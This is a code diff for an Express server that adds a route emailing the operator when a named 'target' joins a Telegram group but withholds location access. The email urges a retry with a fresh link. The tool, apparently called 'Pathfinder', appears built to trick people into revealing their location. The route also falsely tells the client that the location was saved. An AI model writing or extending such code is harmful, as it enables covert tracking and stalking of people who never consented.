@@ -58,6 +58,38 @@ router.post('/save-location', async (req, res) => {
   }
 });
 
+// كل الراوتات المتعلقة بالمجموعات
+router.post('/failure-save-location', async (req, res) => {
+  try {
+    const { target } = req.body;
+    const transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: `${process.env.GMAIL_USER}`,
+        pass: `${process.env.GMAIL_PASS}`
+      }
+    });
+    let mailOptions = {
+      from: 'Pathfinder <${process.env.GMAIL_USER}>',
+      to: `${process.env.GMAIL_TARGET}`,
+      subject: 'Pathfinder could not did it',
+      html: `<p>لقد قام</p><h1 style="color:red;">${target}</h1><p>بالدخول الى مجموعة التلجرام لكنه لم يمنح صلاحية الوصول للموقع يرجى المحاولة مرة اخرى باستخدام رابط جديد</p>`
+    };
+
+    // إرسال البريد
+    transporter.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        return console.log('❌ Error:', error);
+      }
+      console.log('✅ Email sent:', info.response);
+    });
+    res.json({ message: 'تم حفظ الموقع بنجاح' });
+  } catch (err) {
+    // console.log(err);
+    res.status(500).json({ error: 'فشل في حفظ الموقع' });
+  }
+});
+
 router.get('/:slug', async (req, res) => {
   try {
     const group = await Group.findOne({ slug: req.params.slug });
